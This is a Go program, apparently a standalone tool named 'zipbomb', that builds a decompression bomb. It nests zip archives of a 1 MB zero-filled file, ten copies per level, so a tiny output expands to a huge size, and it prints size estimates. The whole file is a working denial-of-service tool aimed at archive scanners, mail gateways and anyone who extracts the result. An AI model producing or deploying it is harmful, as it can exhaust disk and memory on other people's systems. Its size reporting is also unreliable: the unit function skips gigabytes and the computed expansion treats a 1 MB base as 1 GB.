package main

import (
	"archive/zip"
	"fmt"
	"io/ioutil"
	"math"
	"os"
	"strconv"
)

func generateDummyFile(size int) []byte {
	return make([]byte, size*1024*1024)
}

func compressFile(data []byte, filename string) {
	zipFile, _ := os.Create(filename)
	defer zipFile.Close() // Adicione esta linha
	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	fileWriter, _ := zipWriter.Create("dummy.txt")
	fileWriter.Write(data)
}

func makeCopiesAndCompress(filename, outFilename string, nCopies int) {
	zipFile, _ := os.Create(outFilename)
	defer zipFile.Close()
	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	data, _ := ioutil.ReadFile(filename)
	for i := 0; i < nCopies; i++ {
		fileWriter, _ := zipWriter.Create(fmt.Sprintf("dummy-%d.zip", i))
		fileWriter.Write(data)
	}
}

func chooseAppropriateUnit(value float64) (float64, string) {
	bytes := value * 1024 * 1024 * 1024

	if bytes < 1024 {
		return bytes, "Bytes"
	}

	kilobytes := value * 1024 * 1024
	if kilobytes < 1024 {
		return kilobytes, "Kilobytes"
	}

	megabytes := value * 1024
	if megabytes < 1024 {
		return megabytes, "Megabytes"
	}

	terabytes := value / 1024
	if terabytes < 1024 {
		return terabytes, "Terabytes"
	}

	petabytes := terabytes / 1024
	if petabytes < 1024 {
		return petabytes, "Petabytes"
	}

	exabytes := petabytes / 1024
	if exabytes < 1024 {
		return exabytes, "Exabytes"
	}

	zettabytes := exabytes / 1024
	if zettabytes < 1024 {
		return zettabytes, "Zettabytes"
	}

	yottabytes := zettabytes / 1024
	return yottabytes, "Yottabytes"
}

func closestPowerOfTwo(number float64) float64 {
	return math.Round(math.Log2(number))
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage:")
		fmt.Println("  zipbomb n_levels out_zip_file")
		return
	}

	nLevels, _ := strconv.Atoi(os.Args[1])
	outZipFile := os.Args[2]

	dummyData := generateDummyFile(1)
	compressFile(dummyData, "1.zip")

	for i := 1; i <= nLevels; i++ {
		inFilename := fmt.Sprintf("%d.zip", i)
		outFilename := fmt.Sprintf("%d.zip", i+1)
		makeCopiesAndCompress(inFilename, outFilename, 10)
		os.Remove(inFilename)
	}

	if _, err := os.Stat(outZipFile); err == nil {
		os.Remove(outZipFile)
	}
	err := os.Rename(fmt.Sprintf("%d.zip", nLevels+1), outZipFile)
	if err != nil {
		fmt.Println("Error renaming file:", err)
		return
	}

	fileInfo, _ := os.Stat(outZipFile)
	zipSizeKB := float64(fileInfo.Size()) / 1024.0
	decompressedSizeGB := math.Pow(10, float64(nLevels))
	result, unit := chooseAppropriateUnit(decompressedSizeGB)
	var power float64
	power = closestPowerOfTwo(decompressedSizeGB * 1024 * 1024 * 1024)
	fmt.Printf("power = %.0f\n", power)
	fmt.Printf("Compressed File Size: %.2f KB\n", zipSizeKB)
	fmt.Printf("Size After Decompression: %.0f\n", decompressedSizeGB)
	fmt.Printf("Size After Decompression: %.0f %s\n", result, unit)
}
